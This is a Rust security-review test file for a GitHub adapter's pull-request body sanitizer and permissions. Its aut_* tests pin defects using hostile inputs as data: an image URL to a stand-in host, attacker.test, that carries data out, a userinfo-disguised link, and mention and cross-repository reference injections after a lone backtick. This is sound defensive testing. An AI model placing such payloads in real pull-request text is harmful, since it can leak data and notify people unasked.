//! Security review of the GitHub adapter (authority and evidence review, 2026-10-28).
//!
//! Tests named `aut_*` show a confirmed defect and are `#[ignore]`d, so the normal run stays
//! green. Tests named `held_*` pin what the review attacked and found sound; they run normally.
//! Everything runs against the testkit's fake GitHub on the loopback interface. Nothing here
//! was run against the real GitHub, and where a finding depends on how GitHub renders text that is
//! said in its message.
//!
//! One defect:  `cargo test -p factory-github --test security_review --locked -- --ignored <name> --exact`
//! All defects: `cargo test -p factory-github --test security_review --locked -- --ignored aut_`
//! All probes:  `cargo test -p factory-github --test security_review --locked held_`

#[path = "../common/mod.rs"]
mod common;

use common::harness::{FIXTURE, World};
use common::spans::assert_no_live_mention;
use factory_domain::vocabulary::{GateOutcome, StageKind};
use factory_ports::githost::{
    ChangeHost, CheckConclusion, CommentTarget, DraftPrRequest, GitHostError, GitScope,
};
use factory_ports::paths::BranchName;
use factory_testkit::contracts::githost::scope;

fn delivery() -> GitScope {
    GitScope {
        stage: StageKind::Delivery,
        ..scope(1, 1)
    }
}

fn draft(body: &str) -> DraftPrRequest {
    DraftPrRequest {
        head: BranchName::new("factory/job-1").unwrap(),
        base: BranchName::new("main").unwrap(),
        title: "Add a word count command".to_owned(),
        body: body.to_owned(),
    }
}

/// What the code host holds as the body of the pull request after the adapter cleaned `body`.
async fn stored_body(body: &str) -> String {
    let world = World::new();
    let host = world.adapter.change_host();
    let pr = host
        .open_draft_pull_request(&delivery(), draft(body))
        .await
        .unwrap_or_else(|error| panic!("the body was refused: {error:?}"));
    world.fake.pull_json(FIXTURE, pr.number).unwrap()["body"]
        .as_str()
        .unwrap()
        .to_owned()
}

// ---- AUT-6: an image survives inside a link to an allowed host --------------------------------

/// `policies/security.yaml` `output_hygiene` says a rendered body carries no image, because GitHub
/// fetches images and an image URL carries data out. `neutralize_links` removes a bare image, but
/// when an image is the label of a link to an allowed host it copies the whole link unchanged
/// (`text.rs`, the `host_allowed` branch), and the later pass that removes bare URLs looks only
/// for `http://`, `https://` and `www.`. A protocol-relative image URL passes both. Whether
/// GitHub fetches it through its image proxy is not verified here (no real GitHub); the filter's
/// own contract, "no image", is what fails.
#[tokio::test]
async fn aut_6_an_image_inside_a_link_to_an_allowed_host_is_removed() {
    let body = stored_body(
        "Result: [![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture)",
    )
    .await;
    assert!(
        !body.contains("attacker.test"),
        "the body still holds the image: {body:?}"
    );
}

/// The same hole through an image reference whose definition sits in a block quote, where
/// `drop_definitions` does not look. The reference is the label of an allowed link.
#[tokio::test]
async fn aut_6_a_linked_image_reference_is_removed() {
    let body = stored_body(
        "[![chart][r]](https://github.com/example-org/fixture)\n\n> [r]: //attacker.test/b.png",
    )
    .await;
    assert!(
        !body.contains("attacker.test"),
        "the body still holds the image: {body:?}"
    );
    // The image reference itself is gone too, not only its definition.
    assert!(
        !body.contains("!["),
        "the body still holds an image: {body:?}"
    );
}

// ---- AUT-7: a lone backtick switches the mention filter off -----------------------------------

/// `neutralize_tokens` leaves an `@name` alone when the character before it is a backtick, and
/// writes a safe mention as a code span with a closing backtick. A lone backtick in hostile text
/// is not a code span (CommonMark needs a closing one), so GitHub renders the mention as a live
/// one and notifies the person or the whole team. The existing NT-SEC-04 test cannot see this,
/// because it checks only that an `@` is *preceded* by a backtick, which the attack satisfies.
#[tokio::test]
async fn aut_7_a_mention_after_an_unmatched_backtick_is_made_inert() {
    let body = stored_body("Please look, `@example-org/security-team now").await;
    assert!(
        body.contains("`@example-org/security-team`"),
        "the mention is not inside a closed code span: {body:?}"
    );
    // Read independently of the filter: nothing is left outside a code span.
    assert_no_live_mention(&body, "the pull request body");
}

/// The same switch for a reference to another repository (`owner/repo#12`), which makes a
/// back-link in that repository's issue.
#[tokio::test]
async fn aut_7_a_cross_repository_reference_after_an_unmatched_backtick_is_made_inert() {
    let body = stored_body("See `victim/repo#12 for details").await;
    assert!(
        body.contains("`victim/repo#12`"),
        "the reference is not inside a closed code span: {body:?}"
    );
    assert_no_live_mention(&body, "the pull request body");
}

// ---- AUT-8: neutral means passed for a required check -----------------------------------------

/// The port says "success, skipped and neutral count as passing" for a required check
/// (`ports/src/githost.rs`, `CheckConclusion`). The helper answers `Neutral` for an empty set of
/// gates and the comment on it says "no evidence is not a pass". Those two statements cannot both
/// hold: a ruleset that requires `factory-validation` is satisfied by the check this builds.
/// The delivery stage cannot reach it today (`parse_validation` refuses an empty report list),
/// so the finding is latent.
#[test]
fn aut_8_no_gate_reports_is_not_a_conclusion_that_passes_a_required_check() {
    // A required check accepts success, skipped and neutral. Nothing shown must be none of them.
    let accepted = [CheckConclusion::Success, CheckConclusion::Neutral];
    let conclusion = factory_github::conclusion_for_gates(&[]);
    assert!(
        !accepted.contains(&conclusion),
        "an empty set of gates is published as {conclusion:?}, which GitHub counts as passing"
    );
    let all_not_applicable = factory_github::conclusion_for_gates(&[
        GateOutcome::NotApplicable,
        GateOutcome::NotApplicable,
    ]);
    assert!(!accepted.contains(&all_not_applicable));
    assert_eq!(conclusion, CheckConclusion::ActionRequired);
    assert_eq!(all_not_applicable, CheckConclusion::ActionRequired);
    // A set with a pass in it is still a success, and one failure still fails it.
    assert_eq!(
        factory_github::conclusion_for_gates(&[GateOutcome::NotApplicable, GateOutcome::Passed]),
        CheckConclusion::Success
    );
    assert_eq!(
        factory_github::conclusion_for_gates(&[GateOutcome::Passed, GateOutcome::Failed]),
        CheckConclusion::Failure
    );
}

// ---- held --------------------------------------------------------------------------------------

/// The adapter has no way to merge or to mark a pull request ready: `Method` has no PUT, and no
/// source file of the crate names a merge or ready endpoint, a GraphQL mutation or auto-merge.
#[test]
fn held_the_adapter_has_no_call_that_merges_or_marks_ready() {
    let sources = [
        ("changes.rs", include_str!("../../src/changes.rs")),
        ("client.rs", include_str!("../../src/client.rs")),
        ("core.rs", include_str!("../../src/core.rs")),
        ("issues.rs", include_str!("../../src/issues.rs")),
        ("token.rs", include_str!("../../src/token.rs")),
        ("adapter.rs", include_str!("../../src/adapter.rs")),
        ("edits.rs", include_str!("../../src/edits.rs")),
    ];
    let wire = include_str!("../../src/wire.rs");
    assert!(!wire.contains("Put"), "wire.rs gained a PUT method");
    for (name, source) in sources {
        let code: String = source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n");
        for needle in [
            "/merge",
            "ready_for_review",
            "graphql",
            "auto_merge",
            "markPullRequestReady",
            "enablePullRequestAutoMerge",
            "Method::Put",
            "mutation",
        ] {
            // The one read of GraphQL the adapter makes (the time a body was last edited, DR-1) is
            // in `edits.rs`, and only there. A mutation is named nowhere, that file included.
            if name == "edits.rs" && needle == "graphql" {
                continue;
            }
            assert!(
                !code
                    .to_ascii_lowercase()
                    .contains(&needle.to_ascii_lowercase()),
                "{name} names {needle}"
            );
        }
    }
    // `edits.rs` is allowed one query, and it is a constant read: it starts with `query`, asks for
    // one field, and the only route to GraphQL is that file's.
    let edits = include_str!("../../src/edits.rs");
    assert!(
        edits.contains("pub(crate) const QUERY: &str = \"query("),
        "the one GraphQL document of the adapter is a query"
    );
    assert_eq!(
        edits.matches("const QUERY").count(),
        1,
        "edits.rs holds one GraphQL document"
    );
    for (name, source) in sources {
        if name != "edits.rs" {
            assert!(
                !source.contains("edits::ROUTE") || name == "issues.rs",
                "{name} reaches GraphQL; only the issue source may"
            );
        }
    }
}

/// NT-MRG-05, pinned at the wire. The source scan above reads names; this one drives every call of
/// both ports against the fake and lists the method and route of every request the adapter made. A
/// new route, or a method other than GET, POST, PATCH and (for the installation token) DELETE,
/// fails this test, so adding a call that merges, marks a pull request ready or enables auto-merge
/// cannot be done without editing the list below on purpose.
#[tokio::test]
async fn held_every_request_of_the_adapter_is_on_a_short_list_of_methods_and_routes() {
    use factory_ports::githost::{CommentRef, IssueRef, IssueSource};
    use factory_ports::paths::RepoRef;

    let world = World::new();
    let host = world.adapter.change_host();
    let source = world.adapter.issue_source();
    let repo = RepoRef::parse(FIXTURE).unwrap();
    let issue_number = world.fake.add_issue(
        FIXTURE,
        "Add word count",
        "Please.",
        "octocat",
        &["factory"],
    );
    let issue = IssueRef {
        repo: repo.clone(),
        number: issue_number,
    };

    // Every call of the issue source, then every call of the change host. Answers do not matter:
    // the requests are what is pinned.
    let intake = GitScope {
        stage: StageKind::Intake,
        ..scope(1, 1)
    };
    let _ = source.fetch_issue(&intake, &issue).await;
    let _ = source.label_actor(&intake, &issue, "factory").await;
    let _ = source.text_edit(&intake, &issue).await;
    let _ = source
        .fetch_comment(
            &intake,
            &CommentRef {
                target: CommentTarget::Issue(issue.clone()),
                id: 1,
            },
        )
        .await;
    let _ = source.repository_protection(&intake).await;

    let _ = host.fetch_target(&delivery()).await;
    let _ = host
        .push_target(&delivery(), &BranchName::new("factory/job-1").unwrap())
        .await;
    let _ = host
        .resolve_branch(&delivery(), &BranchName::new("main").unwrap())
        .await;
    let pr = host
        .open_draft_pull_request(&delivery(), draft("Evidence follows."))
        .await
        .unwrap();
    let _ = host
        .update_pull_request_body(&delivery(), &pr, "Evidence follows, again.", None)
        .await;
    let _ = host
        .post_comment(
            &delivery(),
            &CommentTarget::PullRequest(pr.clone()),
            "Validation passed.",
            "k1",
        )
        .await;
    let _ = host.pull_request_state(&delivery(), &pr).await;
    let as_approval = GitScope {
        stage: StageKind::Approval,
        ..scope(1, 1)
    };
    let _ = host
        .post_comment(
            &as_approval,
            &CommentTarget::PullRequest(pr.clone()),
            "The decision is recorded.",
            "k2",
        )
        .await;
    let _ = host.revoke_job_tokens(delivery().job).await;

    let _ = host
        .publish_check(
            &delivery(),
            factory_ports::githost::CheckRequest {
                commit: factory_ports::paths::CommitSha::parse(
                    &world.fake.branch_sha(FIXTURE, "factory/job-1").unwrap(),
                )
                .unwrap(),
                name: factory_domain::values::Slug::parse("factory-validation").unwrap(),
                external_id: factory_domain::values::Slug::parse("run-1").unwrap(),
                status: factory_ports::githost::CheckStatus::Completed(CheckConclusion::Success),
                title: "Validation".to_owned(),
                summary: "Every gate ran.".to_owned(),
                details_url: None,
            },
        )
        .await;

    // The routes the adapter may use, and no others. None names a merge, a ready-for-review move,
    // auto-merge or GraphQL, and the only DELETE is the installation token's.
    const PINNED: &[&str] = &[
        "DELETE /installation/token",
        "GET /app",
        "GET /repos/{owner}/{repo}",
        "GET /repos/{owner}/{repo}/branches/{branch}",
        "GET /repos/{owner}/{repo}/issues/{number}",
        "GET /repos/{owner}/{repo}/issues/{number}/comments",
        "GET /repos/{owner}/{repo}/issues/{number}/events",
        "GET /repos/{owner}/{repo}/pulls",
        "GET /repos/{owner}/{repo}/pulls/{number}",
        "GET /repos/{owner}/{repo}/rules/branches/{branch}",
        "GET /repos/{owner}/{repo}/commits/{sha}/check-runs",
        "PATCH /repos/{owner}/{repo}/pulls/{number}",
        "PATCH /repos/{owner}/{repo}/check-runs/{id}",
        "POST /app/installations/{id}/access_tokens",
        "POST /graphql",
        "POST /repos/{owner}/{repo}/issues/{number}/comments",
        "POST /repos/{owner}/{repo}/pulls",
        "POST /repos/{owner}/{repo}/check-runs",
    ];
    for route in PINNED {
        for forbidden in ["merge", "ready", "graphql", "auto", "PUT "] {
            // The one read of GraphQL (DR-1): a POST to `/graphql`, named in `edits.rs`.
            if *route == "POST /graphql" && forbidden == "graphql" {
                continue;
            }
            assert!(
                !route.contains(forbidden),
                "the pinned list names {forbidden:?}: {route}"
            );
        }
    }
    let mut seen: Vec<String> = world
        .fake
        .requests()
        .iter()
        .map(|request| request.route.clone())
        .collect();
    seen.sort();
    seen.dedup();
    assert!(!seen.is_empty(), "the calls made no request");
    for route in &seen {
        assert!(
            PINNED.contains(&route.as_str()),
            "the adapter made a request that is not on the list: {route}"
        );
    }
    // The routes this sequence reached include the three that change a pull request.
    for route in [
        "POST /repos/{owner}/{repo}/pulls",
        "PATCH /repos/{owner}/{repo}/pulls/{number}",
        "POST /repos/{owner}/{repo}/issues/{number}/comments",
    ] {
        assert!(seen.iter().any(|s| s == route), "{route} was not reached");
    }
}

/// A push credential and a branch for the pull request are only for `factory/` branches.
#[tokio::test]
async fn held_a_push_target_for_the_default_branch_is_refused() {
    let world = World::new();
    let host = world.adapter.change_host();
    for name in ["main", "master", "release/1.0", "factory", "Factory/x"] {
        let branch = BranchName::new(name).unwrap();
        assert_eq!(
            host.push_target(&delivery(), &branch).await.err(),
            Some(GitHostError::BranchNotAllowed),
            "{name}"
        );
    }
    let mut request = draft("x");
    request.head = BranchName::new("main").unwrap();
    request.base = BranchName::new("factory/job-1").unwrap();
    assert_eq!(
        host.open_draft_pull_request(&delivery(), request)
            .await
            .err(),
        Some(GitHostError::BranchNotAllowed)
    );
}

/// A link whose address hides another host behind user information, or that is not on the list,
/// loses its address. A bare image loses its address too.
#[tokio::test]
async fn held_links_to_other_hosts_and_bare_images_are_removed() {
    let body = stored_body(
        "[a](https://github.com@attacker.test/x) [b](https://attacker.test/y) [c](http://github.com/z) ![d](https://github.com/example-org/fixture/raw/main/i.png) https://attacker.test/q www.attacker.test/r",
    )
    .await;
    assert!(!body.contains("attacker.test"), "{body:?}");
    assert!(!body.contains("!["), "{body:?}");
    assert!(!body.contains("](http://"), "{body:?}");
}

/// A comment cannot be posted on an issue or pull request of another repository, and the
/// refusal happens before any request is made.
#[tokio::test]
async fn held_a_comment_for_another_repository_makes_no_request() {
    let world = World::new();
    let host = world.adapter.change_host();
    let before = world.fake.requests().len();
    let other = factory_ports::githost::PullRequestRef {
        repo: factory_ports::paths::RepoRef::parse(common::harness::OTHER).unwrap(),
        number: 1,
    };
    let result = host
        .post_comment(
            &delivery(),
            &CommentTarget::PullRequest(other),
            "hello",
            "key",
        )
        .await;
    assert_eq!(result.err(), Some(GitHostError::NotFound));
    assert_eq!(world.fake.requests().len(), before);
}

// ---- AUT-11: the time a label was applied ------------------------------------------------------

/// The adapter reads the time of the `labeled` event, so that intake can compare it with the time
/// the issue was last changed. A label applied, removed and applied again is the later application,
/// and an edit afterwards moves the issue's own time past it.
#[tokio::test]
async fn aut_11_the_application_of_a_label_carries_the_time_of_the_event() {
    use factory_ports::githost::{IssueRef, IssueSource};
    use factory_ports::paths::RepoRef;
    use std::time::Duration;

    let world = World::new();
    let source = world.adapter.issue_source();
    let number = world
        .fake
        .add_issue(FIXTURE, "Add word count", "Please.", "octocat", &[]);
    let issue = IssueRef {
        repo: RepoRef::parse(FIXTURE).unwrap(),
        number,
    };
    let intake = GitScope {
        stage: StageKind::Intake,
        ..scope(1, 1)
    };

    // Nothing applied yet.
    assert_eq!(
        source.label_application(&intake, &issue, "factory").await,
        Ok(None)
    );

    // The maintainer applies the label at 10:00:00.
    world
        .fake
        .label_issue(FIXTURE, number, "factory", "maintainer");
    let first = source
        .label_application(&intake, &issue, "factory")
        .await
        .unwrap()
        .expect("the label is on the issue");
    assert_eq!(first.actor.id, 77);
    assert_eq!(first.actor.login.as_str(), "maintainer");
    let first_time = first.applied_at.expect("the host records the time");
    assert_eq!(first_time.as_text(), "2026-10-28T10:00:00Z");

    // The author edits the body ten minutes later. The issue's time moves past the label's.
    world.clock.advance(Duration::from_secs(600));
    world.fake.edit_issue_body(FIXTURE, number, "Other words.");
    let issue_now = source.fetch_issue(&intake, &issue).await.unwrap();
    assert!(issue_now.updated_at > first_time);

    // The label comes off and another person puts it back: the application is the later one.
    world.clock.advance(Duration::from_secs(60));
    world
        .fake
        .unlabel_issue(FIXTURE, number, "factory", "maintainer");
    world.clock.advance(Duration::from_secs(60));
    world
        .fake
        .label_issue(FIXTURE, number, "factory", "octocat");
    let second = source
        .label_application(&intake, &issue, "factory")
        .await
        .unwrap()
        .expect("the label is on the issue again");
    assert_eq!(second.actor.id, 1);
    assert!(second.applied_at.expect("a time") > first_time);

    // `label_actor` says the same person, as it always did.
    assert_eq!(
        source.label_actor(&intake, &issue, "factory").await,
        Ok(Some(second.actor))
    );
}

// ---- AUT-9: the approval stage's acknowledgement cannot be posted -----------------------------

/// `ApprovalService::submit` posts "The decision approve by ... is recorded" as the stage
/// `Approval` (`service.rs`, the acknowledgement block) and ignores the answer. The adapter gives
/// every stage except `Delivery` a read-only token (`permissions.rs`, `may_write`), so on the real
/// host that comment is refused. Nothing is lost on the authority side (the decision is recorded
/// first), but the person is never told, and a reader of the service would think they are.
#[tokio::test]
async fn aut_9_the_approval_stage_can_post_the_acknowledgement_it_tries_to_post() {
    let world = World::new();
    let host = world.adapter.change_host();
    let pr = host
        .open_draft_pull_request(&delivery(), draft("Evidence follows."))
        .await
        .unwrap();
    let as_approval = GitScope {
        stage: StageKind::Approval,
        ..scope(1, 1)
    };
    let posted = host
        .post_comment(
            &as_approval,
            &CommentTarget::PullRequest(pr),
            "The decision approve by someone is recorded.",
            "approval-1",
        )
        .await;
    assert!(posted.is_ok(), "{posted:?}");
}
